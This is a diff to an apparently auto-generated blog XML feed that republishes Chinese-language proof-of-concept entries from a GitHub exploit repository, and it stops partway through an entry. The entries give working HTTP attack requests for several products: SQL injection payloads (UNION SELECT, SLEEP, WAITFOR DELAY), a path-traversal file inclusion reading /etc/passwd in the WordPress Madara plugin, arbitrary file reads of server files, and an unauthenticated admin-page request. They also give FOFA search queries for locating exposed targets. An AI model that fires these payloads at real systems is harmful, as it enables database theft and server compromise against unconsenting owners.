@@ -4,6 +4,222 @@
   
   
   <entry>
+    <title>NetMizer日志管理系统SQL注入漏洞</title>
+    <link href="/2025/06/11/github_3047931764/"/>
+    <url>/2025/06/11/github_3047931764/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> NetMizer日志管理系统SQL注入漏洞</p><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> NetMizer日志管理系统的terminals接口存在SQL注入漏洞，攻击者可以通过构造特殊的POST请求来执行任意的SQL命令，可能导致数据库信息泄露或其他更严重的后果。</p><p><strong>产品厂商：</strong> NetMizer</p><p><strong>产品名称：</strong> NetMizer日志管理系统</p><p><strong>搜索语法：</strong> title&#x3D;”NetMizer 日志管理系统”</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/e6f3e6d1f6d2a89b6bd3864a81725e00d71f3ce8/wpoc%2FNetMizer%2FNetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fterminals%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md">https://github.com/eeeeeeeeee-code/POC/blob/e6f3e6d1f6d2a89b6bd3864a81725e00d71f3ce8/wpoc%2FNetMizer%2FNetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fterminals%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="NetMizer日志管理系统terminals接口存在SQL注入"><a href="#NetMizer日志管理系统terminals接口存在SQL注入" class="headerlink" title="NetMizer日志管理系统terminals接口存在SQL注入"></a>NetMizer日志管理系统terminals接口存在SQL注入</h2><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;NetMizer 日志管理系统&quot;</span><br></code></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /data/echart/terminals.<span class="hljs-property">php</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10.15</span>; <span class="hljs-attr">rv</span>:<span class="hljs-number">135.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">135.0</span><br><span class="hljs-title class_">Accept</span>: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment">Content-Length: 40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">action=phonelist-pie&amp;type=3&amp;device=1 UNION ALL SELECT NULL,CONCAT(0x71716a7a71,0x4b486d79695241494a69717451667a6d67487761764e72775a7066514176484f5a47697455596141,0x71766a7171),NULL-- -</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /data/echart/terminals.<span class="hljs-property">php</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10.15</span>; <span class="hljs-attr">rv</span>:<span class="hljs-number">135.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">135.0</span><br><span class="hljs-title class_">Accept</span>: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment">Content-Length: 40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">action=phonelist-grid&amp;type=3&amp;device=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x546d5a417a6972554767676547636c6f794e4e6d464c4e484e49626b6d4c6b4244615a4f67646758,0x717a7a7171),NULL,NULL-- -</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /data/echart/terminals.<span class="hljs-property">php</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10.15</span>; <span class="hljs-attr">rv</span>:<span class="hljs-number">135.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">135.0</span><br><span class="hljs-title class_">Accept</span>: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment">Content-Length: 40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">action=phonelist-bar&amp;type=3&amp;device=1 AND (SELECT 6478 FROM (SELECT(SLEEP(5)))hviO)</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>原创先锋后台管理未授权访问漏洞</title>
+    <link href="/2025/06/11/github_418785276/"/>
+    <url>/2025/06/11/github_418785276/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 原创先锋后台管理未授权访问漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 原创先锋后台管理系统中的admin_list.html页面存在未授权访问漏洞，攻击者可以通过构造特定的POST请求直接访问该页面，无需认证即可获取敏感信息或执行管理操作。</p><p><strong>产品厂商：</strong> 原创先锋</p><p><strong>产品名称：</strong> 原创先锋后台管理</p><p><strong>搜索语法：</strong> body&#x3D;”<a href="https://www.bjycxf.com/">https://www.bjycxf.com</a>“</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/d3ffabf7a0e7a5f67e2d4547951906cfe40c9d0a/wpoc%2F%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%2F%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86admin_list%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md">https://github.com/eeeeeeeeee-code/POC/blob/d3ffabf7a0e7a5f67e2d4547951906cfe40c9d0a/wpoc%2F%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%2F%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86admin_list%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="原创先锋后台管理admin-list存在未授权访问"><a href="#原创先锋后台管理admin-list存在未授权访问" class="headerlink" title="原创先锋后台管理admin_list存在未授权访问"></a>原创先锋后台管理admin_list存在未授权访问</h2><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">body</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;https://www.bjycxf.com&quot;</span><br></code></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javasrcipt">POST /admin/admin/admin_list.html HTTP/1.1<br>Host: <br>Content-Type: application/json<br>Accept-Encoding: gzip<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3<br>Transfer-Encoding: chunked<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>未授权访问</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>WordPress Madara 本地文件包含漏洞</title>
+    <link href="/2025/06/11/github_242490122/"/>
+    <url>/2025/06/11/github_242490122/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WordPress Madara 本地文件包含漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-4524</li></ul><p><strong>漏洞类型：</strong> 文件包含</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> WordPress Madara插件存在本地文件包含漏洞，攻击者可以通过构造特殊的POST请求，利用该漏洞读取服务器上的任意文件，如&#x2F;etc&#x2F;passwd，可能导致敏感信息泄露。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> WordPress Madara</p><p><strong>搜索语法：</strong> body&#x3D;”&#x2F;wp-content&#x2F;plugins&#x2F;madara&#x2F;“</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/62816db2d87c798b6d6ff32017c44c43578a6f6f/wpoc%2FWordPress%2FWordPress%20Madara%E5%AD%98%E5%9C%A8%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(CVE-2025-4524).md">https://github.com/eeeeeeeeee-code/POC/blob/62816db2d87c798b6d6ff32017c44c43578a6f6f/wpoc%2FWordPress%2FWordPress%20Madara%E5%AD%98%E5%9C%A8%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(CVE-2025-4524).md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="WordPress-Madara存在本地文件包含-CVE-2025-4524"><a href="#WordPress-Madara存在本地文件包含-CVE-2025-4524" class="headerlink" title="WordPress Madara存在本地文件包含(CVE-2025-4524)"></a>WordPress Madara存在本地文件包含(CVE-2025-4524)</h3><h3 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">body</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/wp-content/plugins/madara/&quot;</span><br></code></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /wp-admin/admin-ajax.<span class="hljs-property">php</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">2</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">Win64</span>; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">128.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">128.0</span><br><span class="hljs-title class_">Accept</span>: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 490</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">action=madara_load_more&amp;page=1&amp;template=plugins/../../../../../../../etc/passwd&amp;vars%5Borderby%5D=meta_value_num&amp;vars%5Bpaged%5D=1&amp;vars%5Btimerange%5D=&amp;vars%5Bposts_per_page%5D=16&amp;vars%5Btax_query%5D%5Brelation%5D=OR&amp;vars%5Bmeta_query%5D%5B0%5D%5Brelation%5D=AND&amp;vars%5Bmeta_query%5D%5Brelation%5D=AND&amp;vars%5Bpost_type%5D=wp-manga&amp;vars%5Bpost_status%5D=publish&amp;vars%5Bmeta_key%5D=_latest_update&amp;vars%5Border%5D=desc&amp;vars%5Bsidebar%5D=right&amp;vars%5Bmanga_archives_item_layout%5D=big_thumbnail</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>文件包含</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>银达汇智智慧综合管理平台SQL注入漏洞</title>
+    <link href="/2025/06/11/github_2346889955/"/>
+    <url>/2025/06/11/github_2346889955/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 银达汇智智慧综合管理平台SQL注入漏洞</p><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 银达汇智智慧综合管理平台的PPlugList接口存在SQL注入漏洞，攻击者可以通过构造特定的HTTP请求利用此漏洞，导致数据库信息泄露或其他恶意操作。</p><p><strong>产品厂商：</strong> 银达汇智</p><p><strong>产品名称：</strong> 智慧综合管理平台</p><p><strong>搜索语法：</strong> title&#x3D;”智慧综合管理平台登入”</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/debdc330171deebd82032392bc2aef100b17f5d9/wpoc%2F%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%2F%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0PPlugList%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md">https://github.com/eeeeeeeeee-code/POC/blob/debdc330171deebd82032392bc2aef100b17f5d9/wpoc%2F%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%2F%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0PPlugList%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="银达汇智智慧综合管理平台PPlugList接口存在SQL注入"><a href="#银达汇智智慧综合管理平台PPlugList接口存在SQL注入" class="headerlink" title="银达汇智智慧综合管理平台PPlugList接口存在SQL注入"></a>银达汇智智慧综合管理平台PPlugList接口存在SQL注入</h2><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">title</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;智慧综合管理平台登入&quot;</span><br></code></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascrip">GET /Module/CJGL/Controller/PPlugList.ashx?action=find&amp;PlugIdentID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞</title>
+    <link href="/2025/06/11/github_1663882700/"/>
+    <url>/2025/06/11/github_1663882700/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞</p><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 灵当CRM系统接口Playforrecord.php接口处存在任意文件读取漏洞，允许攻击者通过恶意读取系统配置文件，获取敏感信息。</p><p><strong>产品厂商：</strong> 灵当CRM</p><p><strong>产品名称：</strong> 灵当CRM系统</p><p><strong>搜索语法：</strong> body&#x3D;”include&#x2F;js&#x2F;ldAjax.js”</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/9aa26356dc02f2f8a4d90eaedd33b29ae212f252/wpoc%2F%E7%81%B5%E5%BD%93CRM%2F%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3Playforrecord%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md">https://github.com/eeeeeeeeee-code/POC/blob/9aa26356dc02f2f8a4d90eaedd33b29ae212f252/wpoc%2F%E7%81%B5%E5%BD%93CRM%2F%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3Playforrecord%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞"><a href="#灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞" class="headerlink" title="灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞"></a>灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞</h2><p>灵当CRM系统接口Playforrecord.php接口处存在任意文件读取漏洞，允许攻击者通过恶意读取系统配置文件，获取敏感信息。</p><h3 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">body=<span class="hljs-string">&quot;include/js/ldAjax.js&quot;</span><br></code></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /crm/modules/<span class="hljs-title class_">Accounts</span>/<span class="hljs-title class_">Playforrecord</span>.<span class="hljs-property">php</span>?download=<span class="hljs-attr">file</span>:<span class="hljs-comment">///D:/ldcrm/www/crm/modules/Accounts/Playforrecord.php HTTP/1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10_15_7</span>) <span class="hljs-title class_">AppleWebKit</span>/<span class="hljs-number">537.36</span> (<span class="hljs-variable constant_">KHTML</span>, like <span class="hljs-title class_">Gecko</span>) <span class="hljs-title class_">Chrome</span>/<span class="hljs-number">135.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-title class_">Safari</span>/<span class="hljs-number">537.36</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Connection: close</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /crm/modules/<span class="hljs-title class_">Accounts</span>/<span class="hljs-title class_">Playforrecord</span>.<span class="hljs-property">php</span>?download=<span class="hljs-attr">file</span>:<span class="hljs-comment">///c:/windows/win.ini HTTP/1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10_15_7</span>) <span class="hljs-title class_">AppleWebKit</span>/<span class="hljs-number">537.36</span> (<span class="hljs-variable constant_">KHTML</span>, like <span class="hljs-title class_">Gecko</span>) <span class="hljs-title class_">Chrome</span>/<span class="hljs-number">135.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-title class_">Safari</span>/<span class="hljs-number">537.36</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Connection: close</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>文件读取</tag>
+      
+      <tag>eeeeeeeeee-code/POC:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>礼品卡电子券收卡系统 SQL注入漏洞</title>
+    <link href="/2025/06/11/github_105476019/"/>
+    <url>/2025/06/11/github_105476019/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 礼品卡电子券收卡系统 SQL注入漏洞</p><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 礼品卡电子券收卡系统存在SQL注入漏洞，攻击者可以通过构造特定的HTTP请求，利用parent_id参数进行SQL注入攻击，从而获取数据库中的敏感信息。</p><p><strong>产品名称：</strong> 礼品卡电子券收卡系统</p><p><strong>搜索语法：</strong> “&#x2F;Application&#x2F;Home&#x2F;Static&#x2F;css&#x2F;style2.css”</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/feee12d472ed6c7b551ade18133019d3559fc96c/wpoc%2F%E7%A4%BC%E5%93%81%E5%8D%A1%E7%94%B5%E5%AD%90%E5%88%B8%E6%94%B6%E5%8D%A1%E7%B3%BB%E7%BB%9F%2F%E7%A4%BC%E5%93%81%E5%8D%A1%E7%94%B5%E5%AD%90%E5%88%B8%E6%94%B6%E5%8D%A1%E7%B3%BB%E7%BB%9Fparent_id%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md">https://github.com/eeeeeeeeee-code/POC/blob/feee12d472ed6c7b551ade18133019d3559fc96c/wpoc%2F%E7%A4%BC%E5%93%81%E5%8D%A1%E7%94%B5%E5%AD%90%E5%88%B8%E6%94%B6%E5%8D%A1%E7%B3%BB%E7%BB%9F%2F%E7%A4%BC%E5%93%81%E5%8D%A1%E7%94%B5%E5%AD%90%E5%88%B8%E6%94%B6%E5%8D%A1%E7%B3%BB%E7%BB%9Fparent_id%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 